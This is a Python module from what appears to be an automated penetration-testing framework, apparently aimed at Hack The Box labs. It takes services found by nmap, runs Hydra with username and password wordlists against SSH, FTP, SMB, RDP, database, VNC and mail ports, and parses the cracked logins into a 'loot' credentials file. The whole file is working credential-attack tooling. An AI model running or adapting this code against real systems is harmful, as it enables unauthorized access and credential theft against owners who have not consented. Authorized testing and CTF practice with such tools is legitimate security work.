"""
ARES - Brute Force Module
Credential brute-forcing with Hydra.
"""
import os
import re
from modules.base import BaseModule
from core.utils import run_command, check_tool, parse_nmap_service
from core import logger


class BruteForceModule(BaseModule):
    name = "bruteforce"
    description = "Credential brute-forcing (SSH, FTP, SMB, HTTP...)"
    required_tools = ["hydra"]
    phase = 2

    # Services worth brute-forcing
    BRUTE_TARGETS = {
        "ssh": {"port": 22, "hydra_module": "ssh"},
        "ftp": {"port": 21, "hydra_module": "ftp"},
        "smb": {"port": 445, "hydra_module": "smb"},
        "rdp": {"port": 3389, "hydra_module": "rdp"},
        "mysql": {"port": 3306, "hydra_module": "mysql"},
        "mssql": {"port": 1433, "hydra_module": "mssql"},
        "postgres": {"port": 5432, "hydra_module": "postgres"},
        "vnc": {"port": 5900, "hydra_module": "vnc"},
        "telnet": {"port": 23, "hydra_module": "telnet"},
        "http-get": {"port": 80, "hydra_module": "http-get"},
        "pop3": {"port": 110, "hydra_module": "pop3"},
        "imap": {"port": 143, "hydra_module": "imap"},
        "smtp": {"port": 25, "hydra_module": "smtp"},
    }

    def run(self, context: dict) -> dict:
        results = {
            "credentials": [],
            "attempted_services": [],
            "raw_files": [],
        }

        # Determine targets from nmap results
        targets = self._identify_targets(context)
        if not targets:
            logger.warning("No brute-forceable services detected.")
            return results

        target_list = ', '.join(f"{t['service']}:{t['port']}" for t in targets)
        logger.info(f"Brute-force targets: {target_list}")

        # Verify wordlists
        if not os.path.isfile(self.config.wordlist_users):
            logger.warning(f"User wordlist not found: {self.config.wordlist_users}")
            return results
        if not os.path.isfile(self.config.wordlist_passwords):
            logger.warning(f"Password wordlist not found: {self.config.wordlist_passwords}")
            return results

        for target in targets:
            service = target["service"]
            port = target["port"]
            hydra_mod = target["hydra_module"]

            logger.info(f"Brute-forcing {service} on port {port}...")
            creds = self._run_hydra(hydra_mod, port)

            results["attempted_services"].append({
                "service": service,
                "port": port,
                "found": len(creds),
            })

            if creds:
                results["credentials"].extend(creds)
                for c in creds:
                    logger.finding(
                        f"CREDENTIAL FOUND: {c['service']} — {c['username']}:{c['password']}",
                        f"Port {c['port']}",
                        severity="critical"
                    )
                    # Save to loot
                    loot_file = os.path.join(self.config.output_dir, "loot", "credentials.txt")
                    with open(loot_file, "a") as f:
                        f.write(f"{c['service']}:{c['port']} — {c['username']}:{c['password']}\n")

        if not results["credentials"]:
            logger.info("No credentials found via brute-force.")

        return results

    def _identify_targets(self, context: dict) -> list:
        """Identify services to brute-force from nmap results."""
        targets = []
        nmap_data = context.get("nmap", {})
        ports = nmap_data.get("ports", [])

        for port_info in ports:
            service = port_info.get("service", "")
            port_num = port_info.get("port", 0)
            hydra_service = parse_nmap_service(service)

            if hydra_service and hydra_service in self.config.brute_services:
                targets.append({
                    "service": service,
                    "port": port_num,
                    "hydra_module": hydra_service,
                })

        return targets

    def _run_hydra(self, hydra_module: str, port: int) -> list:
        """Execute hydra against a specific service."""
        outfile = os.path.join(self.output_path, f"hydra_{hydra_module}_{port}.txt")

        cmd = (
            f"hydra -L {self.config.wordlist_users} "
            f"-P {self.config.wordlist_passwords} "
            f"-s {port} "
            f"-t {min(self.config.threads, 4)} "  # Keep threads low for brute-force
            f"-f "  # Stop on first valid pair
            f"-o {outfile} "
            f"-u "  # Try each user with all passwords before next user
            f"{self.config.target_ip} "
            f"{hydra_module}"
        )

        # Limit password list for HTB (first 500 passwords usually enough)
        if self.config.intensity != "aggressive":
            pw_head = os.path.join(self.output_path, f"passwords_{port}.txt")
            run_command(f"head -500 {self.config.wordlist_passwords} > {pw_head}")
            if os.path.isfile(pw_head):
                cmd = cmd.replace(self.config.wordlist_passwords, pw_head)

        result = run_command(cmd, timeout=300)
        return self._parse_hydra_output(result, outfile, hydra_module, port)

    def _parse_hydra_output(self, cmd_result: dict, outfile: str, service: str, port: int) -> list:
        """Parse hydra output for valid credentials."""
        creds = []

        # Parse from stdout
        output = cmd_result.get("stdout", "") + "\n"
        if os.path.isfile(outfile):
            with open(outfile) as f:
                output += f.read()

        # Hydra format: [PORT][SERVICE] host: IP   login: USER   password: PASS
        pattern = r'\[\d+\]\[[^\]]+\]\s+host:\s+\S+\s+login:\s+(\S+)\s+password:\s+(.*?)$'
        for match in re.finditer(pattern, output, re.MULTILINE):
            creds.append({
                "service": service,
                "port": port,
                "username": match.group(1),
                "password": match.group(2).strip(),
                "host": self.config.target_ip,
            })

        return creds
